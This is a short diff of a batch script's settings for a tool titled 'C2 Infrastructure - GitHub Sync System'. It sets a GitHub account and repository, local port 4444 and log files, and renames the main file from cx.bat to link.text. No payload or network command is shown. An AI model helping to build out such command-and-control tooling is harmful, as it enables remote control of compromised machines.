@@ -9,7 +9,7 @@ title C2 Infrastructure - GitHub Sync System
 set "GH_USER=osmanius21-maker"
 set "GH_REPO=osm"
 set "LOCAL_PORT=4444"
-set "MAIN_FILE=cx.bat"
+set "MAIN_FILE=link.text"
 set "LOG_FILE=history.log"
 set "LAST_LINK=none"
 
